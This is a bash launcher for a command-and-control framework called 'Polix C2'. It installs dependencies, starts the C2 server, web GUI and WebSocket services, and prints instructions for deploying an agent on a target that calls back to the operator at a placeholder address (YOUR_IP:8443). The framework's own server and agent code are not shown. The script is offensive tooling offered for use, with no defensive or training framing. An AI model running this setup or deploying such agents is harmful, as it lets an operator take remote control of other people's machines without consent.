#!/bin/bash

echo "=========================================="
echo "  Polix C2 Framework Launcher"
echo "=========================================="

# Check Python
if ! command -v python3 &> /dev/null; then
    echo "[-] Python3 not found. Please install Python 3.8+"
    exit 1
fi

# Install dependencies
echo "[*] Installing Python dependencies..."
pip3 install -r requirements.txt --quiet

# Start C2 Server
echo "[*] Starting C2 Server on port 8443..."
python3 c2_server.py &
SERVER_PID=$!

sleep 3

# Start Web GUI
echo "[*] Starting Web GUI on http://localhost:5000..."
python3 c2_gui.py &
GUI_PID=$!

echo ""
echo "=========================================="
echo "  C2 Framework Running!"
echo "=========================================="
echo "  C2 Server API: http://localhost:8443"
echo "  Web GUI: http://localhost:5000"
echo "  WebSocket: ws://localhost:8765"
echo ""
echo "  To deploy agent on target:"
echo "  python3 c2_agent.py --server http://YOUR_IP:8443"
echo ""
echo "  Press Ctrl+C to stop all services"
echo "=========================================="

# Wait for interrupt
trap "kill $SERVER_PID $GUI_PID 2>/dev/null; echo -e '\n[!] C2 Framework stopped'; exit" INT

# Keep script running
wait
